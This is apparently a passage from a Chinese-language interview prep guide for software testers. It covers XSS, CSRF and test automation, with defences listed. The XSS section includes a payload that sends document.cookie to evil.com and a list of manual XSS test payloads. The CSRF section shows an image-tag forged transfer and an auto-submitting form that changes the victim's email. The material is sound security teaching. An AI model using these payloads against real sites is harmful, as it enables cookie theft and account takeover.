| **存储型XSS** | 恶意脚本被存储到数据库，任何用户访问都执行 | 高 | 评论、用户名、留言板 |
| **DOM型XSS** | 通过修改DOM触发的XSS | 中 | 前端拼接的HTML |

**攻击示例**：

存储型XSS：
```
攻击者在用户名的输入框中输入：
<script>alert(document.cookie)</script>

该用户名存储到数据库后，其他用户查看该用户的资料页时
页面会嵌入这个<script>，弹出其他用户的Cookie
```

更危险的Payload：
```html
<script>
new Image().src = "http://evil.com/steal?cookie=" + document.cookie;
// 将Cookie发送到攻击者服务器
</script>
```

**XSS测试方法**：

1. **手动测试Payload清单**
```
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
```

2. **自动化工具**
   - XSStrike
   - OWASP ZAP
   - Burp Suite

**判断XSS存在**：
- Payload的弹窗出现了
- 查看页面源码，输入的脚本未被转义

**防范方式**：
- 输出编码：将`<`转成`&lt;`，`>`转成`&gt;`等
- 输入验证和净化
- 使用Content-Security-Policy(CSP)头
- HttpOnly Cookie（即使XSS成功也无法窃取Cookie）

**加分项 / 深度展开**

- 提到XSS不仅限于`<script>`标签，事件处理器（onerror, onload）也是攻击入口
- 举例：测试一个论坛系统时，在帖子内容中输入`<script>alert(1)</script>`，提交后每次打开帖子都弹窗，确认是存储型XSS。严重P0漏洞，任何人可以在帖子中植入脚本来获取所有浏览者的Cookie和操作权限

### Q34：CSRF攻击是什么？如何测试和防范？

**题目类别**：安全测试
**难度**：中高
**出现频率**：高

**考点分析**
CSRF是经典的Web攻击方式，需要理解其攻击原理和防御机制。

**参考答案**

CSRF(Cross-Site Request Forgery)跨站请求伪造，是利用用户已登录的身份，在用户不知情的情况下，以用户的名义发起恶意请求。

**攻击原理**：

```
1. 用户登录了银行网站 bank.com（取得了Cookie/Session）
2. 同时用户又访问了恶意网站 evil.com
3. evil.com 的页面中包含一个隐藏的请求：
   <img src="http://bank.com/transfer?to=attacker&amount=10000" />
4. 浏览器加载该图片时，会自动携带 bank.com 的 Cookie
5. 银行服务器收到请求，验证Cookie有效，执行转账操作
6. 用户完全不知情，钱已被转走
```

**CSRF测试方法**：

1. 登录目标系统，获取认证状态
2. 构造CSRF测试页面：
```html
<html>
<body>
    <form action="http://target.com/api/changeEmail" method="POST" id="csrf">
        <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```
3. 在同一浏览器中打开测试页面
4. 如果请求成功执行，说明存在CSRF漏洞

**防御方式**：

| 防御方式 | 原理 | 有效性 |
|---------|------|--------|
| **CSRF Token** | 服务端生成随机Token，前端请求携带，服务端验证 | 最有效 |
| **SameSite Cookie** | Cookie设置SameSite=Lax/Strict，限制跨站携带 | 现代浏览器有效 |
| **Referer/Origin验证** | 检查请求来源是否为合法域名 | 可被绕过 |
| **验证码/二次确认** | 关键操作需要验证码 | 用户体验差 |
| **自定义Header** | 使用自定义Header(X-Requested-With) | 简单请求不可靠 |

**加分项 / 深度展开**

- 区分CSRF和XSS：CSRF是利用用户的认证状态（不需要获取Cookie值），XSS是窃取Cookie/脚本执行
- 举例：测试发现一个修改绑定手机号的接口，没有CSRF Token校验，也没有Referer校验。我制作了一个CSRF POC页面，成功地将测试账号的绑定手机号修改为指定号码。这个漏洞如果被利用，攻击者可以通过修改手机号来重置密码，完全接管账号

### Q36：什么是自动化测试？什么样的场景适合做自动化？

**题目类别**：自动化测试
**难度**：初级
**出现频率**：极高

**考点分析**
考察自动化测试的合理判断力，不是所有测试都适合自动化。

**参考答案**

自动化测试是使用专门的软件工具来控制测试的执行，并将实际结果与预期结果进行比较的过程。

**适合自动化的场景**：

1. **重复性高的回归测试**：需求稳定、频繁执行的用例
2. **数据驱动的测试**：同一逻辑大量数据的验证
3. **复杂计算验证**：人工容易算错的场景
4. **负载/性能测试**：非自动化不可的场景
5. **稳定的接口/模块**：变化频率低的用例
6. **兼容性测试**：多浏览器/多设备

**不适合自动化的场景**：
1. 需求频繁变化的模块（自动化维护成本 > 收益）
2. 只运行1-2次的用例
3. 需要人工主观判断的测试（如UI美观度）
4. 探索性测试

**加分项 / 深度展开**

- 提到自动化ROI计算公式：ROI = (手工执行耗时 * 预计执行次数 - 自动化开发耗时 - 维护耗时) / (自动化开发耗时 + 维护耗时)
- 举例：我做自动化取舍的案例——一个管理后台一年只上线2个版本，回归测试手工1天完成，自动化开发需要5天。算下来ROI为负，决定不做自动化
